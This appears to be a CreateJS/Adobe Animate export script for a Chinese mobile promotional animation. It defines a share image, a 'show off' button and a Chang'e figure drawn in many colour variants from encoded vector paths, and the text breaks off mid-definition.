(function (lib, img, cjs) {

var p; // shortcut to reference prototypes

// library properties:
lib.properties = {
	width: 720,
	height: 1100,
	fps: 30,
	color: "#202330",
	manifest: [
		{src:"images/转发给好友_.png", id:"转发给好友"}
	]
};



// symbols:



(lib.转发给好友 = function() {
	this.initialize(img.转发给好友);
}).prototype = p = new cjs.Bitmap();
p.nominalBounds = new cjs.Rectangle(0,0,640,970);


(lib.炫耀一下 = function() {
	this.initialize();

	// 图层 2
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#202330").s().p("AghCPIAAkEIh4AAQgSAAgBgUQAAgVASgCIEyAAQASACADAVQgBAUgSAAIiSAAIAAAjQA+AmA1AwQAUAVgNAUQgPANgYgUQgygughgXIAACuQgBAQgTABQgVgBAAgQg");
	this.shape.setTransform(164.9,40.2);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#202330").s().p("AiYAXQgSAAgBgXQABgVASgBIEuAAQAUABACAVQgCAXgUAAg");
	this.shape_1.setTransform(126.9,39.1);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#202330").s().p("AglChIAAhDQgMAegRAXQgOASgNAAQgPAAAAgPIAAiXIgJAAQAAB7gQAfQgLAVgRgDQgRgIAIgWQAMgfADgcQADgcAAg3IgLAAQgKAAAAgSQABgRALgCIAjAAIAAgcQgGAPgMgCQgKgDgEgQQgPguAAgKQgFgRAOgGQAPgDAFAPIASA9IAAhWQAAgNASAAQAQAAACANIAABjIABgNIACgDIAJg4QAGgVATAHQACgOAKAAIBBAAQAcAAgCARIAABuQgBARgWgDIgDAEQgFAHgDACIAtAAQgPgOAKgNQgEgHAYgPIAPgJQAIgEAGgFQALgGAHAFIAAgoQgBgIgIgBIgrAAQgPAAgBgSQABgSAPgBIBGAAQAVABABAVIAABoQgBAPgUABQgTgBAAgPIAAgOQgGAJgWAMIgDACQAJAMgFAHIA8AAQANABAAAPQAAAQgNAAIhDAAIAAAPIA6AAQANABAAAPQAAAPgNAAIg7AAIAAAPIA+AAQAYAQgYAPIg+AAIAAAPIBKAAQANABAAAOQAAAQgNACIihAAQgBAQgRABQgUgBAAgQgAAACAIAxAAIAAgPIgxAAgAhKBhQAFgFAGgKIADgGQANgLAKAPIAAgrQgQAPgKgMQgPgOAVgSQAZgQAZgfQALgMAJAGIAAhGQAAgKgJAAIgmAAQgMABgDgGIgKA9QgJAZgWgPIAAAUIAcAAQAPABABATQgBASgPAAIgMAAgAAABSIAxAAIAAgPIgxAAgAAAAkIAvAAIAAgPIgvAAgAgygkQgHgMALgLIADgBIAegYQAMgHAHAMQAHANgKAJIggAZQgFACgEAAQgHAAgFgGgABNhSIgEgFIgGgKQgJgMAKgKQAMgJAMAKIABAEIAMAPQAGAMgMAJQgFADgEAAQgHAAgGgHgAglhYIgEgGIgDgJQgGgLAMgFQAMgFAHAJQAAADADAGIAFAHQADALgMAGIgHABQgHAAgDgHg");
	this.shape_2.setTransform(88.9,39.3);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#202330").s().p("ACDChIgDgFIAAgEIiWAJQgZgCgGgMQgEgMAQgTQgVAQgNgTQgFgEgBgFIgOgVQgOApgVAaQgOASgTgJQgQgMAPgSQA0hEgDhqIAAhqQAAgQAUgBQASAAACARIAABCIAKgRQAIgMALAAQAAgRASAAIBHAAQgDgCgBgDIgDgEQgPgSASgMQARgKAMANQAGAHAGAMIADACIADAPIBJAAQANADACARQgCAUgNAAIhcAAQgrAxgMAQQgIAKADAFQADAEAMgBIAtAAQAGgIgCADQAcggAGgFQAUgPAOAPQAOAPgOANIgcAcQg8BAgbAeQgLAMACAEQADAEAQgBQAJABAcgBIAqgDIgIgNQgEgMgIgPQgLgTAUgJQAUgIAKASQAdA5AKAgQADAVgRAGIgJABQgNAAgEgOgAhLgbQgDAsgFARQAWAaAVAfQAGAMgEAJQAdgjAqgxIg+AAQgogDAZgpQAXggAigrIgnAAQgKAagnAmgAinAAQABgvgGgxQgEgTATgDQAQAAAFAPQAHAwgBA5QgCATgTAAQgQAAAAgVg");
	this.shape_3.setTransform(50.9,39.3);

	// 图层 1
	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f("#FFA300").s().p("ArqGbQiJAAhhhPQhghQAAhxIAAkVQAAhxBghPQBhhQCJAAIXVAAQCJAABhBQQBgBPAABxIAAEVQAABxhgBQQhhBPiJAAg");
	this.shape_4.setTransform(107.8,41.2);

	this.addChild(this.shape_4,this.shape_3,this.shape_2,this.shape_1,this.shape);
}).prototype = p = new cjs.Container();
p.nominalBounds = new cjs.Rectangle(0,0,215.6,82.4);


(lib.嫦娥_mc = function(mode,startPosition,loop) {
	this.initialize(mode,startPosition,loop,{});

	// 图层 1
	this.shape = new cjs.Shape();
	this.shape.graphics.f("#FC01FF").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape.setTransform(83.3,88.3);

	this.shape_1 = new cjs.Shape();
	this.shape_1.graphics.f("#C69C6D").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_1.setTransform(83.3,88.3);

	this.shape_2 = new cjs.Shape();
	this.shape_2.graphics.f("#0EBF04").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_2.setTransform(83.3,88.3);

	this.shape_3 = new cjs.Shape();
	this.shape_3.graphics.f("#E9342D").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_3.setTransform(83.3,88.3);

	this.shape_4 = new cjs.Shape();
	this.shape_4.graphics.f("#89FE01").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_4.setTransform(83.3,88.3);

	this.shape_5 = new cjs.Shape();
	this.shape_5.graphics.f("#FF7F00").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_5.setTransform(83.3,88.3);

	this.shape_6 = new cjs.Shape();
	this.shape_6.graphics.f("#61FFAC").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_6.setTransform(83.3,88.3);

	this.shape_7 = new cjs.Shape();
	this.shape_7.graphics.f("#9C79D1").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_7.setTransform(83.3,88.3);

	this.shape_8 = new cjs.Shape();
	this.shape_8.graphics.f("#0522D1").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_8.setTransform(83.3,88.3);

	this.shape_9 = new cjs.Shape();
	this.shape_9.graphics.f("#7200FF").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_9.setTransform(83.3,88.3);

	this.shape_10 = new cjs.Shape();
	this.shape_10.graphics.f("#8B8B8B").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_10.setTransform(83.3,88.3);

	this.shape_11 = new cjs.Shape();
	this.shape_11.graphics.f("#FDF901").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_11.setTransform(83.3,88.3);

	this.shape_12 = new cjs.Shape();
	this.shape_12.graphics.f("#F283AC").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_12.setTransform(83.3,88.3);

	this.shape_13 = new cjs.Shape();
	this.shape_13.graphics.f("#0084FF").s().p("ADWNzIg6gEQhhhchDjnQg+jRAKiBQAGhJgHhGIgIg3QithEgwirQgPg2AAg5IACguQggAAgwBOQgYAmgSAnQg4BqheAmQgdAMgeAEIgYABQh2gggng/QgNgUgDgUIAAgRQARAYBCARQAhAJAdAEQBUAgBGg8QAVgTASgbIANgWQAohHA+hMIA2g/QgDgRgegKIgegGQg2iIAAiKQABgrAGgmIAFgeQBTAbBHBtQAkA3ASAxQBDCABNAfQAnAPAZgKIACgTQgbgugBhIIAFhAQhVhLgBg+QAAgTAIgQIAIgMQAugaAsA8QAUAdANAjQAGAgAOAGQAHADAGgEIAAgTQAWhkAtgWQAOgHAOACQAIABAEACQAbAdgLA6QgFAegLAXQgNAPgDASQgBAKABAGQAmBmgxBFQgZAiggANQgLAYAQAZQANAVASAHQA0ATAzBFQAaAjAPAfQAegEALATQAFAKgBAKQAdA7ByBHQA6AjAzAYQgTAJgmgGIgigHQACBCgOBHQgIAjgIAWQgPglgugnIgqggQAWCZDyDiQB5ByB1BSQjVCwj9AtQhMAOhHAAIgFAAgAEwD4QgFgjgThKIgShCIg4AYQAEA1AvA2QAYAbAXARIAAAAgACtAAQAXATAbgCIAAg6QgaAHgeg+IgYg+QgSB0AwAqgAgwgpQgRjDgEg8QgegPgigWQhDgrgPgcIgHgEQgIgDgGAHQgTAVAIBsIAGAbQAKAiARAfQA3BkBvAqIAAAAgAhNssIgEAGQgDAIACAMQAJAkBCA2IAHAEQAJABABgQQgKgfgRgdQgcgvgXAAQgFAAgEACgABssaQgYAOgIA2IAJABQAMACAOAGQALgPAIgRQAQgjgPgOg");
	this.shape_13.setTransform(83.3,88.3);

	this.shape_14 = new cjs.Shape();
